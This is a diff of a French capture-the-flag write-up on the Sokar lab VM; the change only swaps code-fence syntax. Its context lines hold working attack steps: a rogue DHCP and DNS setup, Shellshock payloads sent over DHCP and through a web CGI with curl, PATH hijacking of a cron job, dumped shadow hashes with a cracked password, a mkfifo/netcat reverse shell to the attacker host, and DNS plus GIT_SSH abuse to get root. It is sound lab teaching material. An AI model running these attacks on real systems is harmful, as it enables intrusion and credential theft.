@@ -14,7 +14,7 @@ Ce n'était de toute évidence pas la façon dont les organisateurs pensaient qu
 
 Un scan Nmap rapide ne dévoile aucun port ouvert (le scan rapide ne teste que les ports les plus utilisés), tous les ports testés sont derrière un firewall :  
 
-```plain
+```
 # nmap -T4 192.168.1.63
 
 Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-17 22:15 CET
@@ -38,25 +38,25 @@ Peut-être que des connexions intéressantes sont faites à destination de *Soka
 
 D'abord on va activer le routage sur notre machine :  
 
-```plain
+```
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 Ensuite le traffic DNS qui passe par notre machine nous sera redirigé :  
 
-```plain
+```
 iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
 ```
 
 Tant qu'à faire, si on envoie des réponses autant qu'elles semblent provenir du serveur de destination initiale :  
 
-```plain
+```
 iptables -t nat -A POSTROUTING -j MASQUERADE
 ```
 
 Vous devriez obtenir un état comme celui-ci :  
 
-```plain
+```
 # iptables -L -t nat
 Chain PREROUTING (policy ACCEPT)
 target     prot opt source               destination         
@@ -75,7 +75,7 @@ MASQUERADE  all  --  anywhere             anywhere
 
 Maintenant on va utiliser *Metasploit* pour lancer un serveur DHCP paramêtré à notre avantage (car nous déclarant comme le routeur).  
 
-```plain
+```
 msf > use auxiliary/server/dhcp
 msf auxiliary(dhcp) > set DHCPIPSTART 192.168.1.62
 DHCPIPSTART => 192.168.1.62
@@ -95,7 +95,7 @@ msf auxiliary(dhcp) >
 
 On laisse le serveur DHCP en tache de fond et on lance un faux serveur DNS qui répondra par notre adresse pour le nom *sokar* :  
 
-```plain
+```
 msf auxiliary(dhcp) > back
 msf > use auxiliary/server/fakedns
 msf auxiliary(fakedns) > set TARGETHOST 192.168.1.3
@@ -113,7 +113,7 @@ msf auxiliary(fakedns) >
 
 Voilà, voilà... On reboot la VM et cette fois :  
 
-```plain
+```
 [*] 192.168.1.63:55310 - DNS - DNS target domain found: sokar
 [*] 192.168.1.63:55310 - DNS - DNS target domain sokar faked
 [*] 192.168.1.63:55310 - DNS - XID 14390 (IN::A sokar)
@@ -137,7 +137,7 @@ Puisqu'un client DHCP tourne sur la machine j'ai choisi de m'orienter vers la fa
 
 Après avoir mis fin au faux serveur DHCP je configure le module *Metasploit* qui nous intéresse :  
 
-```plain
+```
 msf > use exploit/unix/dhcp/bash_environment
 msf exploit(bash_environment) > set SRVHOST 192.168.1.3
 SRVHOST => 192.168.1.3
@@ -161,7 +161,7 @@ On aura préalablement mit en place un mini serveur HTTP pour que la victime ré
 
 Et devinez qui vient diner ce soir ?  
 
-```plain
+```
 python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 192.168.1.63 - - [17/Feb/2015 22:43:03] "GET /tshd HTTP/1.0" 200 -
@@ -173,7 +173,7 @@ Il faut attendre un peu avoir de pouvoir profiter de l'attaque car comme on le v
 
 Facile... mais sans grands intérêts.  
 
-```plain
+```
 $ ./tsh 192.168.1.63
 sh-4.1# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -255,7 +255,7 @@ On est pas des manches, on se relève les manches !
 
 Un scan plus complet nous révèle l’existence d'un port TCP :  
 
-```plain
+```
 $ sudo nmap -p1-65535 -T4 192.168.1.63
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2015-02-23 11:48 CET
@@ -271,7 +271,7 @@ Nmap done: 1 IP address (1 host up) scanned in 584.82 seconds
 
 Pas grand chose à voir sur le site mis à part la présence d'un CGI en iframe :  
 
-```plain
+```
 $ curl -I http://192.168.1.63:591/
 HTTP/1.1 200 OK
 Date: Mon, 23 Feb 2015 12:50:25 GMT
@@ -304,7 +304,7 @@ La page du CGI affiche une série de lignes qui proviennent de toute évidence d
 
 CGI ? Et si on retentait notre chance avec *Shellshock* (c'est à la mode), cette fois en mode web :  
 
-```plain
+```
 $ ./bin/wapiti http://192.168.1.63:591/ -m shellshock
 Wapiti-2.3.0 (wapiti.sourceforge.net)
 
@@ -328,7 +328,7 @@ Ouvrez /home/devloop/.wapiti/generated_report/index.html dans un navigateur pour
 
 En jouant un peu avec la vulnérabilité on remarque que la variable d'environnement *PATH* est très importante dans l'exploitation. Par exemple si on lance *which wget* en ayant spécifié le chemin complet de *which* :  
 
-```plain
+```
 /usr/bin/which: no wget in ((null))
 ```
 
@@ -355,7 +355,7 @@ J'ai privilégié cette technique car contrairement à la solution précédente 
 
 L'exploit permet d'avoir une simili invite de commande et s'utilise de cette façon :  
 
-```plain
+```
 python xploit.py http://192.168.1.63:591/cgi-bin/cat
 
 $ ls -alR /home
@@ -381,7 +381,7 @@ drwxr-xr-x. 4 root   root    4096 Dec 30 19:20 ..
 
 L'utilisateur *bynarr* n'est pas très regardant quand aux droits d'accès sur son répertoire personnel.  
 
-```plain
+```
 $ find / -user apophis
 
 /mnt
@@ -407,7 +407,7 @@ Intéressant, *bynarr* a un module kernel (qu'on ne peut pas lire) dans son home
 
 Dans le fichier *stats* appartenant à l'utilisateur on trouve l'output des commandes utilisées par le CGI :  
 
-```plain
+```
 $ cat /tmp/stats
 
 Active Internet connections (servers and established)
@@ -442,7 +442,7 @@ A la fin du fichier on trouve ce qui semble être l'output de la commande *iosta
 
 Que se passe t-il si on place le programme *mount* à l'emplacement */home/bynarr/iostat* (on fait la supposition que *iostat* n'est pas appelé via son chemin absolu) ?  
 
-```plain
+```
 $ cat /tmp/stats
 
 Active Internet connections (servers and established)
@@ -478,7 +478,7 @@ Bingo ! Nos commandes sont bien exécutées en tant que *bynarr* via un mécanis
 
 Voyons si on peut aller plus loin :  
 
-```plain
+```
 $ echo "#!/bin/bash" > /tmp/attack
 $ echo "chmod o+r /var/spool/mail/bynarr" >> /tmp/attack
 $ echo "sudo -l" >> /tmp/attack
@@ -487,7 +487,7 @@ $ cp /tmp/attack /home/bynarr/iostat
 
 Une nouvelle piste s'ouvre à nous...  
 
-```plain
+```
 Matching Defaults entries for bynarr on this host:
     !requiretty, visiblepw, always_set_home, env_reset, env_keep="COLORS
     DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
@@ -538,7 +538,7 @@ fi
 
 Il faut parvenir à le faire exécuter en sachant qu'il lit l'action choisie sur l'entrée standard :  
 
-```plain
+```
 $ echo "#!/bin/bash" > /tmp/attack
 $ echo 'if [ ! -f /tmp/ram ]; then echo add | sudo /home/bynarr/lime; fi' >> /tmp/attack
 $ cp /tmp/attack /home/bynarr/iostat
@@ -546,7 +546,7 @@ $ cp /tmp/attack /home/bynarr/iostat
 
 On voit le fichier */tmp/ram* apparaître et grossir pour atteindre sa taille définitive :  
 
-```plain
+```
 $ ls -lh /tmp/ram
 
 -r--r--r-- 1 root root 256M Feb 23 15:04 /tmp/ram
@@ -554,32 +554,32 @@ $ ls -lh /tmp/ram
 
 Après avoir compressé le dump réduit à 40Mo on peut le récupérer assez facilement en exploitant shellshock directement via curl :  
 
-```plain
+```
 curl -A '() { :;}; echo; echo; /usr/bin/base64 /tmp/ram.tar.bz2;' http://192.168.1.63:591/cgi-bin/cat > out
 ```
 
 Dans le dump on trouve notamment l'entrée crontab qui explique la faille :  
 
-```plain
+```
 Feb 23 13:48:01 sokar CROND[4167]: (bynarr) CMD (/bin/bash -l -c 'source ~/.bash_profile; /bin/netstat -an 2>&1 > /tmp/stats; printf "\n" >> /tmp/stats; iostat 2>&1 >> /tmp/stats' > /dev/null)
 ```
 
 Et en cherchant les caractères *$6$* on trouve deux hashs :  
 
-```plain
+```
 $6$ZEMP4rDiYsxlJz4h$boaXcV1Jn5o7VVI0REPHzSFUfYYjugTKez9SuMAGj68dhiUsNEJWBcM19mHMfqm6L422ePhAnRj.irCccHtPU1:::::::
 $6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:::::::
 ```
 
 Via *John The Ripper* j'ai pu en casser un qui s'avère appartenir... à *bynarr* (U m4d br0?)  
 
-```plain
+```
 bynarr:fruity:::::::
 ```
 
 Au passage je note que le fichier /etc/resolv.conf est world-writable :  
 
-```plain
+```
 $ find /etc -writable
 
 /etc/resolv.conf
@@ -595,13 +595,13 @@ Le masochisme à ses limites... PLUS JAMAIS ! JAMAIS ! *\*rire maniaque avec les
 
 Du coup j'ai plutôt choisi de provoquer le chargement en mémoire du */etc/shadow* en appelant sudo de cette façon avant de décharger / recharger le module *LiME* :  
 
-```plain
+```
 echo test | sudo -S -u apophis id
 ```
 
 Et cette fois la pêche est bonne :  
 
-```plain
+```
 root:$6$cWQYjirZ$rADNjUFSiHmYp.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
 bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:16434:0:99999:7:::
 apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
@@ -660,7 +660,7 @@ else:
 
 Et le miracle s'accomplit :  
 
-```plain
+```
 $ python /tmp/do_su.py ls -alR /home/apophis
 
 /home/apophis:
@@ -681,7 +681,7 @@ Après avoir modifié les droits d'accès sur le home d'apophis (de ?) j'ai réc
 
 Le binaire correspond au fait au code C vu sur la première solution. Ce dernier utilise la fonction *gets()* bien connue pour être dangereuse mais la randomisation de la pile, le fait que l'on est sur un système 64bits et la présence de canaries sur la pile rendent l'exploitation impraticable... Il faut voir ailleurs.  
 
-```plain
+```
 $ ltrace -s 256 ./build 
 __libc_start_main([ "./build" ] <unfinished ...>
 __printf_chk(1, 0x7fe39e1ebb6c, 0x7fff43049ef8, 0) = 13
@@ -703,14 +703,14 @@ Entre temps, un éclair de lucidité (ou de génie, n'ayons pas peur des mots :D
 
 *Netcat* est installé sur la machine mais la version ne dispose pas de l'option -e, il faut donc créer un tube nommé (une fifo selon *William Shakespeare*) :  
 
-```plain
+```
 mkfifo /tmp/f
 cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc -6 fe80::ca60:ff:fec9:52af%eth0 9999 >/tmp/f
 ```
 
 Et côté attaquant on lance nonchalamment *ncat*, le couteau suisse du 21ème siècle :  
 
-```plain
+```
 $ ncat -6 -l -v 9999
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Listening on :::9999
@@ -740,7 +740,7 @@ Déjà on a un shell qui sans être extra est plus réaliste :)
 
 Comme la commande *git clone* cherche à contacter un serveur baptisé *sokar-dev* on va profiter de l'accès en écriture à *resolv.conf* pour nous définir comme serveur DNS :  
 
-```plain
+```
 nameserver fe80::ca60:ff:fec9:52af
 nameserver 192.168.0.3
 ```
@@ -749,7 +749,7 @@ J'ai remarqué que pour que la résolution fonctionne il faut mettre une adresse
 
 Et enfin via *dnschef* on répond à chaque requête DNS avec notre adresse IP (ici seuls les enregistrements A et AAAA nous intéressent).  
 
-```plain
+```
 # python dnschef.py -6 -i ::0  --fakeip 192.168.1.3 --fakeipv6 fe80::ca60:ff:fec9:52af --logfile=blah
           _                _          __  
          | | version 0.3  | |        / _| 
@@ -779,7 +779,7 @@ La variable *GIT\_ASKPASS* permet de spécifier une commande qui aurait du se la
 
 En revanche avec *GIT\_SSH* on parvient à exécuter nos commandes (notre script ne doit pas générer d'output car git le lance via un pipe et analyse la sortie). Autre avantage : la commande s'exécute même si on n'a pas créé de dépôt auparavant.  
 
-```plain
+```
 [apophis@sokar ~]$ echo '#!/bin/bash' > cmd
 [apophis@sokar ~]$ echo 'cp /root/flag* /tmp' >> cmd
 [apophis@sokar ~]$ echo 'chmod 777 /tmp/flag*' >> cmd
@@ -825,7 +825,7 @@ L'autre solution sans doute plus propre et de définir un hook Git qui concerne 
 
 Comme on n'a pas d'accès pour écrire directement dans les hooks on fait une copie du dossier et on spécifie le chemin en environnement :  
 
-```plain
+```
 [apophis@sokar ~]$ cp -r /usr/share/git-core/templates/ mytemplates
 [apophis@sokar ~]$ cd mytemplates/hooks
 [apophis@sokar hooks]$ echo '#!/bin/bash' > post-checkout
